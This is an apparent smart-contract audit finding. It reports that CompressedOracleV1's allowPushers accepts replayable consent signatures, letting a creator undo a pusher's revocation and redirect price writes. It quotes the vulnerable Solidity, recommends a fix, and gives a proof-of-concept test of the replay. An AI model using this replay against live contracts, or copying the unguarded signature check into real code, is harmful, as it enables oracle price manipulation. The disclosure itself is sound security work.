### Title
Pusher Delegation Consent Signature Replayable Within Deadline Window, Allowing Creator to Override Pusher Revocation and Redirect Price Writes — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature but never marks that signature as consumed. Because the signed payload contains no nonce, the creator can replay the identical signature an unlimited number of times before the deadline expires. This lets the creator immediately re-establish `namespaceRemapping[pusher] = creator` every time the pusher calls `revokePusher()`, trapping the pusher's price writes inside the creator's namespace against the pusher's will and feeding those writes into any pool that reads from that namespace.

---

### Finding Description

`allowPushers` hashes `(block.chainid, address(this), deadline, pusher, msg.sender)` and recovers the pusher's address from the supplied signature:

```solidity
// CompressedOracle.sol lines 204-209
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
```

There is no `_usedSignatures` mapping, no per-pusher nonce, and no single-use flag. The only replay guard is the deadline check (`block.timestamp <= deadline`). Once the pusher signs consent for a given `(deadline, pusher, creator)` tuple, that signature remains valid for every call to `allowPushers` until the deadline timestamp passes.

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol lines 238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

But the creator can immediately call `allowPushers` again with the same signature bytes, restoring `namespaceRemapping[pusher] = creator`. This cycle can repeat indefinitely until the deadline expires.

The code's own NatSpec acknowledges the concern but misidentifies the deadline as a sufficient fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

The deadline only bounds the window; it does not prevent re-use within that window.

---

### Impact Explanation

`CompressedOracleV1` is an open oracle — `price(feedId, pool)` is permissionless (no in-swap binding, no registration gate). Any pool whose `PriceProvider` reads from a feed in the creator's namespace will consume whatever the pusher writes there.

After the pusher revokes and begins pushing prices into their own namespace (e.g., for a different asset or a different price range), the creator replays the old signature. The pusher's subsequent `fallback` pushes are redirected back into the creator's namespace:

```solidity
// CompressedOracle.sol lines 315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

The pusher believes they are writing to `feedIdOf(pusher, slotIndex, positionIndex)`. The oracle actually writes to `feedIdOf(creator, slotIndex, positionIndex)`. Any pool reading from the creator's namespace now receives the pusher's misdirected prices — which may be for a different asset, a different decimal scale, or a stale/inverted quote — satisfying the **bad-price execution** impact gate.

---

### Likelihood Explanation

- The creator legitimately holds the pusher's signature (they received it during the original delegation flow).
- Replaying it requires only a single public transaction with no special privilege.
- Deadlines in practice are set hours to days in the future (the test suite uses `block.timestamp + 1 days`), giving the creator a large replay window.
- The pusher has no on-chain way to invalidate the signature before the deadline; their only recourse is to stop pushing entirely, which starves their own pools.

---

### Recommendation

Mark each consent signature as consumed after first use. Add a `mapping(bytes32 => bool) private _usedDelegationSignatures` and set it to `true` after the first successful `allowPushers` call for that hash:

```solidity
mapping(bytes32 => bool) private _usedDelegationSignatures;

// inside allowPushers, after ECDSA.recover succeeds:
require(!_usedDelegationSignatures[hash], "signature already used");
_usedDelegationSignatures[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

This mirrors the `_usedCodes[hash] = true` fix applied in the NFTSimpleAuction reference patch (`adf0fe6`). Alternatively, include a per-pusher nonce in the signed payload and increment it on each successful delegation, so each consent is cryptographically unique.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline T = now + 1 days
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — no nonce, no used-flag check
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs); // succeeds with identical sig
assertEq(oracle.namespaceRemapping(pusher), creator); // delegation restored

// 5. Pusher pushes prices (thinking they go to their own namespace)
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(WRONG_PRICE, 2, 2);
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(slotId, pos, raw, tsMs));
assertTrue(ok);

// 6. Wrong price lands in creator's namespace, not pusher's
assertEq(oracle.getOracleData(oracle.feedIdOf(creator, slotId, pos)).price,
         U64x32.decode(uint32(raw >> 16))); // creator's pool reads WRONG_PRICE
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher,  slotId, pos)).price, 0);
```

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L314-321)
```text

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
